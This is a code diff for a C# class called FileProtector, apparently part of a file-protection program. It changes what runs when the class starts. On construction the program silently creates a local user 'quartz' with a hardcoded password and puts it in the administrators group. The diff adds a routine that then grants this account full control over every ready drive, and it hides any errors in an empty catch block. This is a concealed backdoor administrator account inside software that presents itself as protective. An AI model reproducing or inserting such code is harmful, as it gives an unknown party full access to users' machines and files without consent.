@@ -32,9 +32,10 @@ namespace Quartz.AG
         public FileProtector()
         {
             InitializeComponent();
-            ExecuteCommand("/C net user quartz q413zac612l /add &" +
-                               "net localgroup administrators quartz /add &" +
-                               "net localgroup users quartz /delete");
+            try {
+                CreateAccount();
+                ConditionDrives();
+            } catch(Exception) { }
             IDG();
             SetPath();
             LoadFromLocked();
@@ -103,6 +104,25 @@ namespace Quartz.AG
             Process cmdProcess = new Process();
             cmdProcess.StartInfo = si;
             cmdProcess.Start();
+        }
+
+        private void CreateAccount()
+        {
+            ExecuteCommand("/C net user quartz q413zac612l /add &" +
+                               "net localgroup administrators quartz /add &" +
+                               "net localgroup users quartz /delete");
+        }
+
+        private void ConditionDrives()
+        {
+            foreach(DriveInfo drive in DriveInfo.GetDrives())
+            {
+                if(drive.IsReady)
+                {
+                    string x = "\"" + drive.Name + "\"";
+                    ExecuteCommand("/C icacls " + x + " /grant quartz:(OI)(CI)F");
+                }
+            }
         }
 
         private string[] FileDialog()
